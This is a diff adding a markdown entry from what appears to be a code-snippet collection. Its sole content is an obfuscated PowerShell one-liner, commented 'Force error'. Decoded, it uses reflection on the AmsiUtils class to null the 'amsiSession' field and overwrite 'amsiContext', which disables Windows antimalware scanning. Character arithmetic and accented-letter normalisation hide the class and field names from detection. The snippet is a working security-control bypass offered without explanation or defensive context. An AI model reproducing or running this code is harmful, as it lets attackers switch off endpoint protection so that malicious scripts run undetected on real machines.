@@ -1,0 +1,17 @@
+---
+id: 8f98a63d-e5c1-46dc-9d39-358aedc6edfb
+type: code
+language: Powershell
+verified: false
+created_at: '2023-01-10T04:28:58.962465+00:00'
+updated_at: '2023-05-29T16:48:53.365139+00:00'
+---
+
+# Code Snippet 8f98a63d
+
+**Language**: Powershell
+
+```powershell
+#Unknown - Force error 
+$ho=$null;$seuogjh=[$(('S'+'y'+'s'+'t'+'e'+'m').NORMAlIZe([cHar]([byTE]0x46)+[char]([BytE]0x6f)+[ChAR]([BYTe]0x72)+[chAr](10+99)+[chAr]([byte]0x44)) -replace [cHar]([byTE]0x5c)+[CHAr](35+77)+[CHAr]([Byte]0x7b)+[cHar](77+58-58)+[CHAr]([ByTe]0x6e)+[CHAR]([BYTE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076*7283/7283));$zwytwkcjzmbqmenshdf="+('ewsdeld'+'lh').nOrmAlize([chaR](70+13-13)+[chAr]([byte]0x6f)+[CHar](75+39)+[CHar](93+16)+[chAR]([bytE]0x44)) -replace [ChaR]([ByTE]0x5c)+[chAR]([BYTe]0x70)+[CHar](123)+[ChAr]([bytE]0x4d)+[char](110*39/39)+[chAR](125*91/91)";[Threading.Thread]::Sleep(508);[Ref].Assembly.GetType("$(('S'+'y'+'s'+'t'+'e'+'m').NORMAlIZe([cHar]([byTE]0x46)+[char]([BytE]0x6f)+[ChAR]([BYTe]0x72)+[chAr](10+99)+[chAr]([byte]0x44)) -replace [cHar]([byTE]0x5c)+[CHAr](35+77)+[CHAr]([Byte]0x7b)+[cHar](77+58-58)+[CHAr]([ByTe]0x6e)+[CHAR]([BYTE]0x7d)).$(('Mà'+'nâ'+'ge'+'me'+'nt').nOrMalIzE([ChAR](70+5-5)+[CHar](111)+[chaR]([BytE]0x72)+[char]([bYTe]0x6d)+[ChAr]([Byte]0x44)) -replace [chAr](92+13-13)+[chAR]([ByTe]0x70)+[cHAr]([ByTe]0x7b)+[Char](77+17-17)+[cHAR](110+93-93)+[cHAR]([bYTE]0x7d)).$(('Äu'+'tõ'+'mã'+'tî'+'ón').NoRMAlizE([CHAr](70)+[CHar]([byte]0x6f)+[CHar](14+100)+[chAr]([byte]0x6d)+[ChaR](68)) -replace [CHAR]([bytE]0x5c)+[CHar](112*64/64)+[cHAR](14+109)+[Char]([byTe]0x4d)+[CHAR](29+81)+[chaR](125)).$(('ÂmsíU'+'tíls').NorMALIZe([chAr]([bYTE]0x46)+[CHAr]([ByTe]0x6f)+[CHAR]([BYtE]0x72)+[cHaR](109+37-37)+[chAr](68+53-53)) -replace [cHAr](92)+[CHar]([bYTe]0x70)+[char]([byTE]0x7b)+[CHaR]([BYtE]0x4d)+[cHaR]([BYTe]0x6e)+[ChaR](125+105-105))").GetField("$(('ämsìS'+'essîó'+'n').NORmaliZe([ChaR]([Byte]0x46)+[ChAR](111*34/34)+[char]([bYtE]0x72)+[char](107+2)+[chAR]([bYTe]0x44)) -replace [cHar]([byTe]0x5c)+[ChaR](57+55)+[CHAR](123*110/110)+[cHaR](41+36)+[CHAr]([ByTe]0x6e)+[ChaR]([BYTE]0x7d))", "NonPublic,Static").SetValue($ho, $null);[Ref].Assembly.GetType("$(('S'+'y'+'s'+'t'+'e'+'m').NORMAlIZe([cHar]([byTE]0x46)+[char]([BytE]0x6f)+[ChAR]([BYTe]0x72)+[chAr](10+99)+[chAr]([byte]0x44)) -replace [cHar]([byTE]0x5c)+[CHAr](35+77)+[CHAr]([Byte]0x7b)+[cHar](77+58-58)+[CHAr]([ByTe]0x6e)+[CHAR]([BYTE]0x7d)).$(('Mà'+'nâ'+'ge'+'me'+'nt').nOrMalIzE([ChAR](70+5-5)+[CHar](111)+[chaR]([BytE]0x72)+[char]([bYTe]0x6d)+[ChAr]([Byte]0x44)) -replace [chAr](92+13-13)+[chAR]([ByTe]0x70)+[cHAr]([ByTe]0x7b)+[Char](77+17-17)+[cHAR](110+93-93)+[cHAR]([bYTE]0x7d)).$(('Äu'+'tõ'+'mã'+'tî'+'ón').NoRMAlizE([CHAr](70)+[CHar]([byte]0x6f)+[CHar](14+100)+[chAr]([byte]0x6d)+[ChaR](68)) -replace [CHAR]([bytE]0x5c)+[CHar](112*64/64)+[cHAR](14+109)+[Char]([byTe]0x4d)+[CHAR](29+81)+[chaR](125)).$(('ÂmsíU'+'tíls').NorMALIZe([chAr]([bYTE]0x46)+[CHAr]([ByTe]0x6f)+[CHAR]([BYtE]0x72)+[cHaR](109+37-37)+[chAr](68+53-53)) -replace [cHAr](92)+[CHar]([bYTe]0x70)+[char]([byTE]0x7b)+[CHaR]([BYtE]0x4d)+[cHaR]([BYTe]0x6e)+[ChaR](125+105-105))").GetField("$([cHAr](97*14/14)+[cHAr](109)+[char]([bYTe]0x73)+[CHar](105+5-5)+[CHar](67*14/14)+[char]([bytE]0x6f)+[CHar](110+7-7)+[CHAr](116*72/72)+[cHar]([bYte]0x65)+[chaR]([BYTE]0x78)+[ChAr]([byTE]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$seuogjh);
+```
